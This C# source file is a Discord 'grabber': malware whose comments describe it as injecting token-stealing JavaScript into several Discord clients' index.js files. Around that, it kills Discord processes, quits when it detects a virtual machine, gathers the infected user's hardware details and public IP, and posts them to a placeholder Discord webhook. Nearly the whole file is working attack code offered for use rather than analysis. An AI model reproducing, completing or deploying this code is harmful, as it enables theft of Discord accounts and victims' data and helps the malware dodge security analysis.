using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

namespace Furious
{
    public class Grabber
    {
		public static bool UsingVM()
		{
			///If the process is running within a Virtual Machine, the process will close before executing code.
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
						{
							Console.WriteLine("Using VM: true");
							return true;
						}
					}
				}
			}
			Console.WriteLine("Using VM: false");
			return false;
		}

		///This method allows the user to choose to customise the grabber, whether they want to inject the token grabbing code, get the infected user's hardware information, and choose to check for a virtual machine.
		public static async Task QuickStart(bool injectJS = false, bool getUserHardware = false, bool checkForVM = false)
		{
			if (checkForVM)
			{ 
				if (UsingVM())
					Environment.Exit(0);
			}
			if (injectJS)
				CloseProcesses();
			if (getUserHardware)
				await SendData(await GetHardware());
		}

		///This method is used to write the token grabbing JavaScript code into the Discord directory.
		public static async Task InjectJS()
        	{
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
			{
				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord");
				foreach (string folderName in discord)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.DiscordPath = folderName + @"\modules\discord_modules\index.js";
						await FileManagement.CleanFile(FileManagement.DiscordPath);
						await FileManagement.WriteDiscord(FileManagement.DiscordPath);
					}
				}
			}
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb"))
			{
				string[] ptb = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb");
				foreach (string folderName in ptb)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.PTBPath = folderName + @"\modules\discord_modules\index.js";
						await FileManagement.CleanFile(FileManagement.PTBPath);
						await FileManagement.WriteDiscord(FileManagement.PTBPath);
					}
				}
			}
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary"))
			{
				string[] canary = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary");
				foreach (string folderName in canary)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
						await FileManagement.CleanFile(FileManagement.CanaryPath);
                        			await FileManagement.WriteDiscord(FileManagement.CanaryPath);
					}
				}
			}
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment"))
			{
				string[] dev = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discorddevelopment");
				foreach (string folderName in dev)
				{
					if (folderName.Contains("0."))
					{
						Console.WriteLine(folderName);
						FileManagement.DevelopmentPath = folderName + @"\modules\discord_modules\index.js";
						await FileManagement.CleanFile(FileManagement.DevelopmentPath);
						await FileManagement.WriteDiscord(FileManagement.DevelopmentPath);
					}
				}
			}
		}

		///Closes all processes which contain "discord" in their name before writing the JS.
		private static async void CloseProcesses()
		{
			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());

			await InjectJS();
        	}

		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
		public static async Task<string> GetHardware()
		{
			StringBuilder sb = new StringBuilder();

			await Task.Run(() =>
			{
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_Processor").Get())
				{
					sb.AppendLine($"CPU: {obj["Name"]}");
				}
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_VideoController").Get())
				{
					sb.AppendLine($"GPU: {obj["Name"]}");
				}
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
                		{
					sb.AppendLine($"OS: {obj["Caption"]}");
                		}
			});

			Console.WriteLine(sb.ToString());
			return sb.ToString();
		}

		///This method sends the data the paramater holds to a specified Discord webhook.
		public static async Task<HttpResponseMessage> SendData(string data)
		{
			string hook = "webhook-here";
			
			HttpResponseMessage response = null;
			using (HttpClient httpClient = new HttpClient())
			{
				try
				{
					Dictionary<string, string> contents = new Dictionary<string, string>
					{
						{ "content", $"Data for '{ Environment.UserName }' @ { await GrabIP() }	```{ data }```" }
					};

                    			response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
				}
				catch (HttpRequestException ex)
				{
					Debug.WriteLine(ex.Message);
				}
			}

			///This inherited method obtains the users IP address which will be sent to the specified webhook.
			async Task<string> GrabIP() => await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");

			return response;
		}
	}
}
